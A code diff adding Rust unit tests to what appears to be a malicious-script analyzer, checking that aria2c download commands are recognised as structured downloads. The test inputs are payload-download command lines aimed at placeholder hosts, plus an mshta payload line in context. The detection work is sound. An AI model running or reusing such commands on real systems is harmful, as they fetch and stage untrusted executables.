@@ -9236,6 +9236,155 @@ mshta C:/Temp/payload.hta"#,
 }
 
 #[cfg(test)]
+mod aria2_tests {
+    use crate::env::{Config, Environment, FsEntry};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn aria2c_out_and_dir_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"aria2c -d C:\Temp -o payload.exe https://aria2-direct.example/payload.exe"#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://aria2-direct.example/payload.exe"
+                        && dst.as_deref() == Some(r#"C:\Temp\payload.exe"#)
+            )),
+            "aria2c download not structured: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get(r#"c:\temp\payload.exe"#),
+                Some(FsEntry::Download { src }) if src == "https://aria2-direct.example/payload.exe"
+            ),
+            "aria2c destination not tracked: {:?}",
+            env.modified_filesystem
+        );
+    }
+
+    #[test]
+    fn aria2c_input_file_reads_tracked_url_list() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"echo https://aria2-input.example/payload.exe>urls.txt"#,
+            &mut env,
+        );
+        interpret_line(r#"aria2c -i urls.txt -o payload.exe"#, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://aria2-input.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "aria2c input file download not structured: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn aria2c_multiple_direct_urls_emit_structured_downloads() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"aria2c https://aria2-multi.example/a.exe https://aria2-multi.example/b.exe"#,
+            &mut env,
+        );
+
+        for expected in [
+            "https://aria2-multi.example/a.exe",
+            "https://aria2-multi.example/b.exe",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                )),
+                "aria2c multi-URL source {expected} not structured: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn aria2c_out_and_dir_in_deob_text_emits_structured_download() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"aria2c -d C:\Temp -o payload.exe https://aria2-deob.example/payload.exe"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://aria2-deob.example/payload.exe"
+                        && dst.as_deref() == Some(r#"C:\Temp\payload.exe"#)
+            )),
+            "aria2c deob text download not structured: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("aria2-deob.example"))
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "aria2c URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn aria2c_multiple_urls_in_deob_text_emit_structured_downloads() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"aria2c https://aria2-multi-deob.example/a.exe https://aria2-multi-deob.example/b.exe"#,
+            &mut env,
+        );
+
+        for expected in [
+            "https://aria2-multi-deob.example/a.exe",
+            "https://aria2-multi-deob.example/b.exe",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                )),
+                "aria2c deob-text multi-URL source {expected} not structured: {:?}",
+                env.traits
+            );
+        }
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src.contains("aria2-multi-deob.example")
+                )
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "aria2c multi-URL deob text left generic duplicates: {:?}",
+            env.traits
+        );
+    }
+}
+
+#[cfg(test)]
 mod wget_tests {
     use crate::analyze;
     use crate::env::{Config, Environment, FsEntry};
